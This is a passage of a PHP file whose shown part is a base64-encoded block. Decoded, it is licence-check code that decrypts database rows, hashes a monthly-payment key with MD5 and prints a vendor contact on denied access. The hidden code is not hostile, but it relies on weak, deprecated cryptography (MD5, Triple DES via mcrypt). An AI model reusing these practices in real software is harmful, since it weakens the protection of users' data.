VyZSBsbGF2ZV9kZWMhPScnIik7CQ0KCQlpZigkcm93PSRhY2Nlc28tPm9iamV0by0+ZGV2b2x2ZXJSZWdpc3RybygpKXsJDQoJCQkkbnVtID0gY291bnQoJHJvdyk7DQoJCQlmb3IoJGk9MDskaTwkbnVtOyRpKyspew0KCQkJCWVjaG8gJz1AJy56ZW5kX2RlYyh0cmltKCRyb3dbJGldKSwkYWNjZXNvMSk7DQoJCQl9DQoJCX0NCgkJZWxzZXsNCgkJCWVjaG8gImZhbHNlIjsNCgkJfQ0KCX0NCglmdW5jdGlvbiB2ZXJpZmljYW1lbigkYWNjZXNvKXsNCgkJJGRhdG9zPWdldGRhdG9zMSgpOw0KCQkkY2FtcG8gPSBtZDUoJGRhdG9zWzBdLiRkYXRvc1sxXS4kZGF0b3NbMl0uJGRhdG9zWzNdKTsNCgkJJGlkX3NlZz1zdHJ0b3VwcGVyKG1kNSgnMScpKTsNCgkJJF9TRVNTSU9OWyJtZW5zdWFsaWRhZCJdPSRjYW1wbzsNCgkNCgl9DQoJDQoJDQoJZnVuY3Rpb24gemVuZF9kZWNvZGVyKCRzdHJpbmcpew0KCQlpZihuaXZlbDEoKSl7DQoJCWdsb2JhbCAka2V5OyANCgkJDQoJCWdsb2JhbCAkaXY7IA0KCQkkc3RyaW5nID0gdHJpbShiYXNlNjRfZGVjb2RlKCRzdHJpbmcpKTsgIA0KCQkkZGVjID0gQG1jcnlwdF9jYmMgKE1DUllQVF9UcmlwbGVERVMsICRrZXksICRzdHJpbmcsIE1DUllQVF9ERUNSWVBUKTsgDQoJCQkJcmV0dXJuIHRyaW0oJGRlYyk7IA0KCQl9DQoJCWVsc2V7DQoJCQllY2hvICJBY2Nlc28gbm8gYXV0b3JpemFkbyBhIGVzdG9zIGRhdG9zLiAoQ0VERVNPRlQgQk9MSVZBUi4gMDQyNC04MTA2NTUxIC8gMDI5My00MTc3MzUxIEUtbWFpbDogc2FlY28udmVAZ21haWwuY29tKSI7DQoJCX0NCgl9DQoNCg=='));
?>